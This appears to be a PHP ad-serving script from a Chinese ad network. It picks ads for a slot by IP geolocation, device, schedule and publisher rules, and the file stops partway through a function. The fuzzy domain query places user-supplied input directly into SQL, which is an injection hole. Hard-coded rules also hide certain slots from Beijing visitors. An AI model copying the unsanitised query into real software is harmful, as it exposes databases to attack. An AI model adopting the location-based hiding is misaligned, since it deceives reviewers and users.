<?php
exit;
header("Cache-Control: no-cache");
header("Pragma: no-cache");
header("Access-Control-Allow-Credentials: true");

error_reporting(0);
date_default_timezone_set('PRC');//校正时间

$start_timea = microtime(true);

require_once __DIR__ . '/17monipdb/Ipsearch.class.php';
$IpSearch = new IpSearch('qqzeng-ip-utf8.dat');

function dump($var, $echo = true, $label = null, $flags = ENT_SUBSTITUTE)
{
    $label = (null === $label) ? '' : rtrim($label) . ':';
    ob_start();
    var_dump($var);
    $output = ob_get_clean();
    $output = preg_replace('/\]\=\>\n(\s+)/m', '] => ', $output);
    if (false) {
        $output = PHP_EOL . $label . $output . PHP_EOL;
    } else {
        if (!extension_loaded('xdebug')) {
            $output = htmlspecialchars($output, $flags);
        }
        $output = '<pre>' . $label . $output . '</pre>';
    }
    if ($echo) {
        echo($output);
        return null;
    } else {
        return $output;
    }
}

function writeFile($file,$str,$mode='a+')
{

    // $oldmask = @umask(0);
    // $fp = @fopen($file,$mode);
    // // @flock($fp, 3);
    // if(!$fp){

    // } else {
    //     @fwrite($fp,$str);
    //     @fclose($fp);
    //     // @umask($oldmask);
    //     // Return true;
    // }
}

//conf
$cost_type = array('cpm', 'cpv');

require_once __DIR__ . '/sredis.php';

$sredis = new Redisutil();

//log
$log_test_file = 'slog.txt';
$log_test_str = ''.date('Y-m-d H:i:s').'';

//字符串转数组
$show_array = explode(',',$_POST['data']);

$getid = $_GET['id'];

$id = $show_array[0];

$user_IP = GetIp();
$ipInfos = GetIpLookup($user_IP,$IpSearch);

if($id == 49){
    if($ipInfos[3] == '杭州'){
        $id = 6312;
    }
}

if($id == 8036){
    if($ipInfos[3] == '北京'){
        exit;
    }
}

if($id==7135||$id==7337||$id==7908||$id==6776||$id==8012||$id==8417||$id==7688||$id==7679||$id==8726){
    if($ipInfos[3] == '北京'){
        exit;
    } 
}

//数据库连接信息
$db_link = $sredis->db_link;
$db_root = $sredis->db_root;
$db_password = $sredis->db_password;

$url = $sredis->curl_url;
$cilck_url = $sredis->cilck_url;
$sign = $sredis->sign;
try{
    $pdo = new PDO($db_link,$db_root,$db_password);
}catch(PDOException $e){
    // echo '数据库连接失败'.$e->getMessage();
}

$pdo->exec('set names utf8');
//手机型号,设置为全局变量，在计划筛选中用到
global $modle;
$modle = model();

//全局服务器配置地址
$globalSql = $pdo->prepare("select img_server,js_server,jump_server,adv_server,domain_limit,mycom from lz_setting");
$globalSql->execute();
$globalRes = $globalSql->fetchAll();

if (empty($globalRes[0])) {
    $log_test_str.=' ERROR10000'."\n";
    writeFile($log_test_file,$log_test_str);
    echo('服务器地址配置错误');
    exit;
}

//平台域名
$platformUrl = $globalRes[0]['jump_server'];

//获取当前网站域名
$adsthisUrl = $show_array[1];

//图片服务器地址
$img_server = $globalRes[0]['img_server'];
$img_server = empty($img_server) ? $adsthisUrl : $img_server;

$adzLimitSql = $pdo->prepare("select adz_id,uid,htmlcontrol,checkadz,minutes,adtpl_id,width,height,class_id,plan_class_allow from lz_adzone where adz_id=?  AND status=1");
$adzLimitSql->execute(array($id));
$adzList = $adzLimitSql->fetchAll();

if (empty($adzList[0])) {
    $log_test_str.=' 广告位id'.$id.' ERROR10001'."\n";
    writeFile($log_test_file,$log_test_str);
    echo('广告位没有激活');
    exit;
}

//查询出该广告位所有可展示的广告
$ad_id_arr = $pdo->prepare("SELECT ad_id FROM lz_ads WHERE tpl_id=? AND width=? AND height=? AND status=?");
$ad_id_arr->execute(array($adzList[0]['adtpl_id'],$adzList[0]['width'],$adzList[0]['height'],1));
$ad_id_arr = $ad_id_arr->fetchAll();
//将查询出来的数据转换为字符串
$ad_id = '';
foreach($ad_id_arr as $key=>$value){
    $ad_id = $ad_id.','.$value['ad_id'];
}
$ad_id = substr($ad_id,1);
$adzList[0]['show_adid'] = $ad_id;
if (empty($ad_id)) {
    echo('无可展示的广告');
    exit;
}

//站长id
$uid = $adzList[0]['uid'];

// 查看当前域名属于哪个站长的
$userSql = $pdo->prepare("select  uid,domain_limit from lz_users_log WHERE uid=? ");
$userSql->execute(array($uid));
$userRes = $userSql->fetchAll();

// 该站长是否开启域名限制   0 默认 1 开启  2关闭 （默认就根据全局限制）
if ($userRes[0]['domain_limit'] == 0) {

    //全局  开启域名限制，则只有审核的网站可以显示广告 0 关闭 1开启
    if ($globalRes[0]['domain_limit'] == 0) {
        $siteRes = openDomainLimit($uid, $adsthisUrl, $pdo);
        //当前网站是否存在，不存在为空
        if (empty($siteRes)) {
            $siteRes[0] = array(
                "site_id" => 0,
                "uid" => 0,
                "siteurl" => 0,
                "web_deduction" => 0,
                "adv_deduction" => 0,
                'site_cnzz_id' => '',
            );
        }
        $domain_type = 2;
    } else {
        //站长下面所有的站都显示  开启限制
        $siteRes = openDomainLimit($uid, $adsthisUrl, $pdo);
        if (empty($siteRes)) {
            $log_test_str.=' 站长id'.$uid.' 广告投放的网站:'.$adsthisUrl.' ERROR10002'."\n";
            writeFile($log_test_file,$log_test_str);
            echo('该网站没有添加，域名被限制');
            exit;
        }
        $domain_type = 1;
    }
} elseif ($userRes[0]['domain_limit'] == 1) {
    //站长下面所有的站都显示  开启限制
    $siteRes = openDomainLimit($uid, $adsthisUrl, $pdo);

    if (empty($siteRes)) {
        $log_test_str.=' 站长id'.$uid.' 广告投放的网站:'.$adsthisUrl.' ERROR10003'."\n";
        writeFile($log_test_file,$log_test_str);
        echo('该网站没有添加，域名被限制');
        exit;
    }
    $domain_type = 1;
} else {
    $siteRes = openDomainLimit($uid, $adsthisUrl, $pdo);
    //当前网站是否存在，不存在为空
    if (empty($siteRes)) {
        $siteRes[0] = array(
            "site_id" => 0,
            "uid" => 0,
            "siteurl" => 0,
            "web_deduction" => 0,
            "adv_deduction" => 0,
            'site_cnzz_id' => '',
        );
    }
    $domain_type = 2;
}

// 开启限制
function openDomainLimit($uid, $adsthisUrl, $pdo)
{
    if(!empty($adsthisUrl)){
        // 查看当前域名是否存在 和 站点扣量
        $sites = $pdo->prepare("select site_id,uid,siteurl,class_id,web_deduction,adv_deduction,site_cnzz_id from lz_site WHERE uid=? AND siteurl=? AND status=1");
        $sites->execute(array($uid, $adsthisUrl));
        $siteRes = $sites->fetchAll();
    }

    //绝对查询为空，然后模糊查询（例如：绝对查询 www.lezun.com  模糊查询 lezun.com）
    if (empty($siteRes)) {
        $fuzzy_url_array = explode('.',$adsthisUrl);
        $url_count = count($fuzzy_url_array);

        if($url_count == 2){
            $fuzzy_url_array = $fuzzy_url_array[0] . '.' . $fuzzy_url_array[1];
        }elseif($url_count == 3){
            $fuzzy_url_array = $fuzzy_url_array[1] . '.' . $fuzzy_url_array[2];
        }elseif($url_count > 3){
            //截取域名数组的后 2 段
            $on_key = $url_count-2;
            $down_key = $url_count-1;
            $fuzzy_url_array = $fuzzy_url_array[$on_key] . '.' . $fuzzy_url_array[$down_key];
        }else{
            $fuzzy_url_array = '';
        }
        $num = strpos($fuzzy_url_array,"/");
        if(!empty($num)){
            $fuzzy_url_array = substr($fuzzy_url_array,0,$num);
        }

        if(empty($fuzzy_url_array)){
            $siteRes = '';
        }else{
            // 查看当前域名是否存在 和 站点扣量
            $fuzzySites = $pdo->prepare("select  site_id,uid,siteurl,class_id,web_deduction,adv_deduction,site_cnzz_id
            from lz_site WHERE uid = ? AND siteurl LIKE '%$fuzzy_url_array' AND status=1 ");
            $fuzzySites->execute(array($uid));
            $siteRes = $fuzzySites->fetchAll();
        }
    }
    return $siteRes;
}

$html = unserialize($adzList[0]['htmlcontrol']);

//广告位选中的广告
$array_adid = explode(',',$adzList[0]['show_adid']);
$array_adid = array_filter($array_adid);

$ad_id = $adzList[0]['show_adid'];//提出key值，在转字符串  ad_id 广告id
$ad_id = rtrim($ad_id,',');

if (!empty($adzList[0]['htmlcontrol'])) {
    @$style_htmlcontrol = unserialize($adzList[0]['htmlcontrol'])['position'];
} else {
    $style_htmlcontrol = '';
}

// 样式的展示选择
if (!empty($adzList[0]['adtpl_id'])) {
    if ($adzList[0]['adtpl_id'] == 1) {
        $showType = isset($style_htmlcontrol[0]) ? $style_htmlcontrol[0] : 0;
        $showType = $showType . ':0;';
    } elseif ($adzList[0]['adtpl_id'] == 17 && $style_htmlcontrol[0] == 'bottom') {
        $showType = isset($style_htmlcontrol[0]) ? $style_htmlcontrol[0] : 0;
        $styCss = 'top';
    } elseif ($adzList[0]['adtpl_id'] == 17 && $style_htmlcontrol[0] == 'top') {
        $showType = isset($style_htmlcontrol[0]) ? $style_htmlcontrol[0] : 0;
        $styCss = 'bottom';
    } else {
        $showType = isset($style_htmlcontrol[0]) ? $style_htmlcontrol[0] : 0;
    }
} else {
    $showType = '';
}
$styCss = isset($styCss) ? $styCss : '';
$adidArr = array();


if (!empty($adzList[0]['show_adid'])) {
    $adidArr = explode(',',$adzList[0]['show_adid']);
} else {
    $adidArr = '';
}

$limit_pid = '0';
$limit_new_pid = '';

// 广告位没有选择广告
if (empty($adidArr)) {
    $log_test_str.=' 广告位id'.$id.' ERROR10004'."\n";
    writeFile($log_test_file,$log_test_str);
    echo('该广告位下没有可投放的广告');
    exit;
}


if($id != 6312){
    if(empty($ipInfos)){
        $ipInfos = array(
            0 => '',
            1 => '',
            2 => '',
            3 => '',
        );
    }
}

// 用户所在省份和城市
$user_city = $ipInfos[2] . '-' . $ipInfos[3];

//得到激活ad的集合
$ad_sql = $pdo->prepare('SELECT a.ad_id,a.pid as adpid,a.priority AS adpriority,b.pid,b.restrictions,
b.priority,b.resuid,b.checkplan,b.sitelimit,b.limitsiteid,b.class_id,b.run_terminal FROM lz_ads AS a
LEFT JOIN lz_plan AS b ON a.pid = b.pid LEFT JOIN lz_users AS c ON a.uid = c.uid WHERE a.ad_id
IN (' . $ad_id . ') AND b.status = 1 AND a.status =1 AND c.money > c.adv_money AND b.delay_show_status !=1');
$ad_sql->execute(array());
$ad_sql_list = $ad_sql->fetchAll();
//获取手机操作系统
$agent = strtolower($_SERVER['HTTP_USER_AGENT']);
//分析数据
$is_iphone = (strpos($agent, 'iphone')) ? true : false;
$is_ipad = (strpos($agent, 'ipad')) ? true : false;
$is_android = (strpos($agent, 'android')) ? true : false;

if ($is_iphone||$is_ipad) {
    $mobile = '2';
}elseif($is_android){
    $mobile = '3';
}else{
    $mobile = '0';
}

//判断redis里面，本次访问的用户是否访问过此计划id
$user_pid = $sredis->handler()->HMGET($user_IP,array('pid'))['pid'];

//得到正常显示的pid
$normal_pid_array = array();
foreach ($ad_sql_list as $key => $val){

    if(($ad_sql_list[$key]['run_terminal'] == $mobile) || ($ad_sql_list[$key]['run_terminal'] == '0')){
        $normal_pid_array[$val['pid']] = $val['pid'];
    }
}

$redis_pid_arr = array_flip(explode(',', $user_pid));
//判断已展示的pid 和全部pid 对比返回不同的pid
$delay_inter_adids = array_diff_key($normal_pid_array,$redis_pid_arr);
//读取延迟展示情况下每次加一的值
$delay_show_num = $sredis->handler()->HMGET($user_IP.'_delay_show_pid',array('delay_show_num'))['delay_show_num'];
//读取延迟展示的总个数
$delay_show_count = $sredis->handler()->GET($user_IP.'_delay_show_count');
//不限计划延迟也显示
if ($mobile == 2) {
    $mobile = '0,2';
}else{
    $mobile = '0,3';
}
//判断延迟展示计划是否展示完毕
if(($delay_show_num < $delay_show_count) && !empty($delay_show_count)  && !empty($delay_show_num)){

    //如果广告都被展示，则重新来
    if (empty($delay_inter_adids)) {

        //得到激活ad的集合
        $ad_sql = $pdo->prepare('SELECT a.ad_id,a.pid as adpid,a.priority AS adpriority,
        b.pid,b.restrictions,b.priority,b.resuid,b.checkplan,b.sitelimit,b.limitsiteid,b.class_id
        FROM lz_ads AS a LEFT JOIN lz_plan AS b ON a.pid = b.pid LEFT JOIN lz_users AS c ON
         a.uid = c.uid WHERE a.ad_id IN (' . $ad_id . ') AND b.run_terminal IN('.$mobile.') AND b.status = 1
         AND a.status =1 AND c.money > c.adv_money AND b.delay_show_status = 1');
        $ad_sql->execute(array());
        $delay_ad_sql_list = $ad_sql->fetchAll();
        if (!empty($delay_ad_sql_list)) {
            $ad_sql_list = $delay_ad_sql_list;
            //得到延迟显示的pid
            $delay_pid_array = array();
            foreach ($ad_sql_list as $key => $val) {
                $delay_pid_array[$val['pid']] = $val['pid'];
            }
            $delay_show_count = count($delay_pid_array) + 1;
            //存延迟展示的总个数
            $sredis->handler()->SET($user_IP . '_delay_show_count', $delay_show_count);
            //只在延迟展示情况下 每次加 1
            $sredis->handler()->HINCRBY($user_IP . '_delay_show_pid', 'delay_show_num', 1);

        }
    }
}else{
    //正常显示的计划为空
    if(empty($normal_pid_array)){
        //得到激活 延迟计划的 ad的集合
        $ad_sql = $pdo->prepare('SELECT a.ad_id,a.pid as adpid,a.priority AS adpriority,
            b.pid,b.restrictions,b.priority,b.resuid,b.checkplan,b.sitelimit,b.limitsiteid,b.class_id
            FROM lz_ads AS a LEFT JOIN lz_plan AS b ON a.pid = b.pid LEFT JOIN lz_users AS c ON
             a.uid = c.uid WHERE a.ad_id IN (' . $ad_id . ') AND b.run_terminal IN('.$mobile.') AND b.status = 1
             AND a.status =1 AND c.money > c.adv_money AND b.delay_show_status = 1');
        $ad_sql->execute(array());
        $ad_sql_list = $ad_sql->fetchAll();
    }

    $limit_pid_sql = $pdo->prepare('SELECT pid FROM lz_plan WHERE run_terminal IN('.$mobile.')
    AND status = 1 AND delay_show_status = 1 Limit 1');
    $limit_pid_sql->execute(array());
    $delay_limit_list = $limit_pid_sql->fetchAll();
    if(!empty($delay_limit_list)){
        //初始化 总个数值
        $sredis->handler()->SET($user_IP.'_delay_show_count',2);
        $delay_show_num = array(
                'delay_show_num' => 1,
        );
        //初始化
        $sredis->handler()->HMSET($user_IP.'_delay_show_pid',$delay_show_num);
    }
}

if (!empty($adzList[0]['uid'])) {
    $userid = $adzList[0]['uid'];   //广告位属于哪个站长id的
} else {
    $log_test_str.=' ERROR10005'."\n";
    writeFile($log_test_file,$log_test_str);
    echo('该广告位没有所属站长');
    exit;
}

//广告位分类id
$adz_class_id = $adzList[0]['class_id'];
//广告位里面的计划分类
$adz_plan_class_allow = $adzList[0]['plan_class_allow'];
$i = 0;
foreach ($ad_sql_list as $key => $val) {

    if (!empty($ad_sql_list[$i]['pid'])) {

        $checkplanid = $ad_sql_list[$i]['pid'];
        // 获取当前广告的计划设置的投放限制和定向设置
        $checkplan = unserialize($ad_sql_list[$i]['checkplan']);
        // 查看限制站长id是否开启 状态
        $lim_uid_status = (int)$ad_sql_list[$i]['restrictions'];
        $checkplan['city']['isacl'] = (int)$checkplan['city']['isacl'];
        $checkplan['expire_date']['isdate'] = (int)$checkplan['expire_date']['isdate'];
        $checkplan['week']['isacl'] = (int)$checkplan['week']['isacl'];
        $checkplan['siteclass']['isacl'] = (int)$checkplan['siteclass']['isacl'];
        $checkplan['mobile']['isacl'] = (int)$checkplan['mobile']['isacl'];
        //广告位分类
        $checkplan['adzclass']['isacl'] = (int)$checkplan['adzclass']['isacl'];
        $checkplan['run_model']['isacl'] = (int)$checkplan['run_model']['isacl'];

        // 查看限制站长id 数组
        $lim_uid_array = explode(',', $ad_sql_list[$i]['resuid']);
        //今天 星级几 和 现在几时
        $week_day = (date('w') == 0) ? 7 : date('w');
        $day_hours = date('H');

        //限制网站  0 不限制 1 允许 2 屏蔽  和 网站id 数组
        $checkplan['sitelimit'] = (int)$ad_sql_list[$i]['sitelimit'];
        $checkplan['limitsiteid'] = explode(',', $ad_sql_list[$i]['limitsiteid']);
        //计划分类
        $checkplan['class_id'] = $ad_sql_list[$i]['class_id'];
    } else {
        $checkplan['expire_date']['isdate'] = '';
        $lim_uid_status = '';
        $checkplan['city']['isacl'] = '';
        $checkplan['week']['isacl'] = '';
        $checkplan['sitelimit'] = '';
        $checkplan['siteclass']['isacl'] = '';
        $checkplan['adzclass']['isacl'] = '';
    }

    //获取当前广告的计划是否到达结束日期 0 没有结束时间 1 有结束时间  $lim_uid_status 限制站长id 0 不限制 1允许 2 屏蔽
    if ($checkplan['expire_date']['isdate'] == 0 && $lim_uid_status == 0 && $checkplan['city']['isacl'] == 0 && $checkplan['week']['isacl'] == 0 && $checkplan['sitelimit'] == 0 && $checkplan['siteclass']['isacl'] == 0 && $checkplan['mobile']['isacl'] == 0 && $checkplan['run_model']['isacl'] == 0 && $checkplan['adzclass']['isacl'] == 0 && $checkplan['class_id'] == 0) {
    } else {

        $time = strtotime(date('Y-m-d', time()));
        //结束时间 转时间戳
        $expireTime = strtotime($checkplan['expire_date']['year'] . '-' . $checkplan['expire_date']['month'] . '-' . $checkplan['expire_date']['day']);

        //时间状态为 0时，则没有结束时间限制
        if ($checkplan['expire_date']['isdate'] == 0) {
            // 站长限制 2级
            lim_webid_methods($lim_uid_status, $checkplan, $user_city, $week_day, $day_hours, $ad_sql_list, $i, $userid, $lim_uid_array, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

        } elseif (($expireTime - $time) >= 0 && $checkplan['expire_date']['isdate'] == 1) {
            // 站长限制 2级
            lim_webid_methods($lim_uid_status, $checkplan, $user_city, $week_day, $day_hours, $ad_sql_list, $i, $userid, $lim_uid_array, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

            //时间过期
        } else {
            $xianzhi_log_test=' 投放限制-结束日期不满足';

            //不满足条件的存cookies 存pid
            cookie_limit_pid($ad_sql_list, $i);
        }
    }
    $i++;
}

// 站长限制 2级
function lim_webid_methods($lim_uid_status, $checkplan, $user_city, $week_day, $day_hours, $ad_sql_list, $i, $userid, $lim_uid_array, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow)
{
    global $xianzhi_log_test;
    global $log_test_str ;

    $panduan = in_array($userid, $lim_uid_array,true);

    // 0 不限制 1 允许 2 屏蔽
    if ($lim_uid_status == 0) {
        // 投放地域 3级
        lim_provincial_city_methods($checkplan, $user_city, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

        //允许以下站长id (包含当前广告位对应的站长)
    } elseif ($lim_uid_status == 1 && in_array($userid, $lim_uid_array,true)) {
        // 投放地域 3级
        lim_provincial_city_methods($checkplan, $user_city, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

        //允许以下站长（不包含当前广告位对应的站长）
    } elseif ($lim_uid_status == 1 && !$panduan) {

        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);

    } else {
        //屏蔽以下站长（不包含当前广告位对应的站长）
        if ($lim_uid_status == 2 && !in_array($userid, $lim_uid_array,true)) {
            // 投放地域 3级
            lim_provincial_city_methods($checkplan, $user_city, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

        } else {
            $xianzhi_log_test=' 投放限制-站长限制不满足';
            //不满足条件的存cookies 存pid
            cookie_limit_pid($ad_sql_list, $i);
        }
    }
}

// 投放地域 3级
function lim_provincial_city_methods($checkplan, $user_city, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow)
{
    global $xianzhi_log_test;
    if (!empty($checkplan['city']['province'])) {
        for ($a = 0; $a < count($checkplan['city']['province']); $a++) {
            for ($b = 0; $b < count($checkplan['city']['data']); $b++) {
                $provincial_city[] = $checkplan['city']['province'][$a] . '-' . $checkplan['city']['data'][$b];
            }
        }
    } else {
        $provincial_city = '';
    }

    //投放地区限制 0 不限制 1 选择区域
    if ($checkplan['city']['isacl'] == 0) {
        // 周期日程 4级
        lim_week_methods($checkplan, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

    } else {
        //选择区域 1 允许 0 拒绝 包含此地区
        if ($checkplan['city']['comparison'] == 1 && @in_array($user_city, $provincial_city,true)) {
            // 周期日程 4级
            lim_week_methods($checkplan, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

            //选择区域 1 允许 不包含此地区
        } elseif ($checkplan['city']['comparison'] == 1 && @!in_array($user_city, $provincial_city,true)) {

            $xianzhi_log_test=' 定向设置-投放地域不满足';
            //不满足条件的存cookies 存pid
            cookie_limit_pid($ad_sql_list, $i);

            //选择区域 0 拒绝 不包含此地区
        } elseif ($checkplan['city']['comparison'] == 0 && @!in_array($user_city, $provincial_city,true)) {

            // 周期日程 4级
            lim_week_methods($checkplan, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow);

            //选择区域 0 拒绝 包含此地区
        } else {
            $xianzhi_log_test=' 定向设置-投放地域不满足';
            //不满足条件的存cookies 存pid
            cookie_limit_pid($ad_sql_list, $i);
        }
    }
}

// 周期日程 4级
function lim_week_methods($checkplan, $week_day, $day_hours, $ad_sql_list, $i, $siteRes, $pdo,$adz_class_id,$adz_plan_class_allow)
{
    global $xianzhi_log_test;
    //投放周期日程 0 不限制 1 限制
    if ($checkplan['week']['isacl'] == 0) {

        // 网站限制 5级
        lim_site_methods($checkplan, $siteRes, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

    } elseif ($checkplan['week']['isacl'] == 1 && !empty($checkplan['week']['data'][$week_day])) {
        //查看当前时间是否满足周期日程
        if (in_array($day_hours, $checkplan['week']['data'][$week_day]) == true) {

            // 网站限制 5级
            lim_site_methods($checkplan, $siteRes, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        } else {
            $xianzhi_log_test=' 定向设置-周期日程不满足';
            //不满足条件的存cookies 存pid
            cookie_limit_pid($ad_sql_list, $i);
        }
    } else {
        $xianzhi_log_test=' 定向设置-周期日程不满足';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);
    }
}

// 网站限制 5级
function lim_site_methods($checkplan, $siteRes, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow)
{
    global $xianzhi_log_test;
    global $log_test_str;

    //网站限制 0 不限制
    if ($checkplan['sitelimit'] == 0) {

        // 网站类型 6级
        lim_siteclass_methods($checkplan, $siteRes, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        // 1允许 （包含当前广告位投放网站的id）
    } elseif ($checkplan['sitelimit'] == 1 && in_array($siteRes[0]['site_id'], $checkplan['limitsiteid'],true)) {

        // 网站类型 6级
        lim_siteclass_methods($checkplan, $siteRes, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        //1 允许 （不包含当前广告位投放网站的id）
    } elseif ($checkplan['sitelimit'] == 1 && !in_array($siteRes[0]['site_id'], $checkplan['limitsiteid'],true)) {

        $xianzhi_log_test=' 投放限制-网站限制不满足1';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);

        //1 屏蔽 （不包含当前广告位投放网站的id）
    } elseif ($checkplan['sitelimit'] == 2 && !in_array($siteRes[0]['site_id'], $checkplan['limitsiteid'],true)) {

        // 网站类型 6级
        lim_siteclass_methods($checkplan, $siteRes, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        //2 屏蔽 （包含当前广告位投放网站的id）
    } else {
        $xianzhi_log_test=' 投放限制-网站限制不满足2';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);
    }
}

// 网站类型 6级
function lim_siteclass_methods($checkplan, $siteRes, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow)
{
    global $xianzhi_log_test;
    //网站类型 0 不限 1 限制
    if ($checkplan['siteclass']['isacl'] == 0) {

        // 投放设备设置  7级
        lim_mobile_methods($checkplan, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        // 1允许 （包含当前广告位投放网站的分类）
    } elseif ($checkplan['siteclass']['choose'] == 1 && @in_array($siteRes[0]['class_id'], $checkplan['siteclass']['data'])) {

        // 投放设备设置  7级
        lim_mobile_methods($checkplan, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        // 1允许 （不包含当前广告位投放网站的分类）
    } elseif ($checkplan['siteclass']['choose'] == 1 && @!in_array($siteRes[0]['class_id'], $checkplan['siteclass']['data'])) {

        $xianzhi_log_test=' 定向设置-网站类型不满足';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);

        // 0 拒绝 （不包含当前广告位投放网站的分类）
    } elseif ($checkplan['siteclass']['choose'] == 0 && @!in_array($siteRes[0]['class_id'], $checkplan['siteclass']['data'])) {

        // 投放设备设置  7级
        lim_mobile_methods($checkplan, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        // 0 拒绝 （包含当前广告位投放网站的分类）
    } else {
        $xianzhi_log_test=' 定向设置-网站类型不满足';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);
    }
}

// 投放设备设置  7级
function lim_mobile_methods($checkplan, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow)
{
    global $xianzhi_log_test;

    $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    //分析数据
    $is_pc = (strpos($agent, 'windows nt')) ? true : false;
    $is_iphone = (strpos($agent, 'iphone')) ? true : false;
    $is_ipad = (strpos($agent, 'ipad')) ? true : false;
    $is_android = (strpos($agent, 'android')) ? true : false;
    // $is_wp = (strpos($agent, 'wp')) ? true : false;
    $is_wp = (strpos($agent, 'micromessenger')) ? true : false;  //微信

    if($is_wp){
        $mobile = 'wp';  //微信
    }else{
        if ($is_iphone||$is_ipad) {
            $mobile = 'ios';
        }elseif($is_pc){
            $mobile = 'pc';
        }elseif($is_wp){
            $mobile = 'wp';  //微信
        }else{
            $mobile = 'android';
        }
    }
    
    //投放设备 0 不限 1 限制
    if ($checkplan['mobile']['isacl'] == 0) {

        //投放机型 8 级
        lim_run_model_methods($checkplan, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        // 1允许 （包含当前设备）
    } elseif ($checkplan['mobile']['isacl'] == 1 && @in_array($mobile, $checkplan['mobile']['data'],true)) {

        //投放机型 8 级
        lim_run_model_methods($checkplan, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow);

        // 1允许 （不包含当前设备）
    } else {
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);
    }
}

//投放机型 8 级
function lim_run_model_methods($checkplan, $ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow)
{
    global $modle;
    global $xianzhi_log_test;
    //投放机型 isacl:  0 不限制  1 指定终端
    if($checkplan['run_model']['isacl'] == 0){
        //广告位分类限制  9级
        lim_adzclass_methods($checkplan,$ad_sql_list, $i,$pdo,$adz_class_id,$adz_plan_class_allow);
    }else{

        //选择机型 1 允许 包含此机型
        if ($checkplan['run_model']['comparison_mobile'] == 1 && @in_array($modle,$checkplan['run_model']['modle_data'],true)) {
            //广告位分类限制  9级
            lim_adzclass_methods($checkplan,$ad_sql_list, $i,$pdo,$adz_class_id,$adz_plan_class_allow);

            //选择机型 1 允许 不包含此机型
        } elseif ($checkplan['run_model']['comparison_mobile'] == 1 && @!in_array($modle,$checkplan['run_model']['modle_data'],true)) {
            $xianzhi_log_test=' 投放机型不满足';
            //不满足条件的存cookies 存pid
            cookie_limit_pid($ad_sql_list, $i);

            //选择机型 0 拒绝 不包含此机型
        } elseif ($checkplan['run_model']['comparison_mobile'] == 0 && @!in_array($modle,$checkplan['run_model']['modle_data'],true)) {
            //广告位分类限制  9级
            lim_adzclass_methods($checkplan,$ad_sql_list, $i,$pdo,$adz_class_id,$adz_plan_class_allow);

            //选择机型 0 拒绝 包含此机型
        } else {
            $xianzhi_log_test=' 投放机型不满足';
            //不满足条件的存cookies 存pid
            cookie_limit_pid($ad_sql_list, $i);
        }
    }
}

//广告位分类限制 9 级
function lim_adzclass_methods($checkplan,$ad_sql_list, $i, $pdo,$adz_class_id,$adz_plan_class_allow)
{
    global $xianzhi_log_test;
    //广告位分类限制 0 不限 1 限制
    if ($checkplan['adzclass']['isacl'] == 0) {

        //广告位里面的计划分类限制 10 级
        lim_planclass_methods($checkplan,$ad_sql_list, $i,$adz_plan_class_allow);

        // 1允许 （包含当前广告位分类）
    } elseif ($checkplan['adzclass']['choose'] == 1 && @in_array($adz_class_id, $checkplan['adzclass']['data'])) {

        //广告位里面的计划分类限制 10 级
        lim_planclass_methods($checkplan,$ad_sql_list, $i,$adz_plan_class_allow);

        // 1允许 （不包含当前广告位分类）
    } elseif ($checkplan['adzclass']['choose'] == 1 && @!in_array($adz_class_id, $checkplan['adzclass']['data'])) {
        $xianzhi_log_test=' 定向设置-广告位分类不满足';
        cookie_limit_pid($ad_sql_list, $i);

        // 0 拒绝 （不包含当前广告位分类）
    } elseif ($checkplan['adzclass']['choose'] == 0 && @!in_array($adz_class_id, $checkplan['adzclass']['data'])) {

        //广告位里面的计划分类限制 10 级
        lim_planclass_methods($checkplan,$ad_sql_list, $i,$adz_plan_class_allow);
        // 0 拒绝 （包含当前广告位分类）
    } else {
        $xianzhi_log_test=' 定向设置-广告位分类不满足';
        //不满足条件的存cookies 存pid
        cookie_limit_pid($ad_sql_list, $i);
    }
}

//广告位里面的计划分类限制 10 级
function lim_planclass_methods($checkplan,$ad_sql_list, $i,$adz_plan_class_allow)
{
    global $xianzhi_log_test;
    if(!empty($adz_plan_class_allow)){
        $adz_plan_class_allow = explode(',',$adz_plan_class_allow);
    }

    //广告位里面的计划分类限制 0 不限
    if ($checkplan['class_id'] == 0 || empty($adz_plan_class_allow)) {

        // 1允许 （广告位包含当前计划分类）
    } elseif ($checkplan['class_id'] != 0 && @in_array($checkplan['class_id'], $adz_plan_class_allow)) {

        // 允许 （广告位不包含当前计划分类）
    } else {
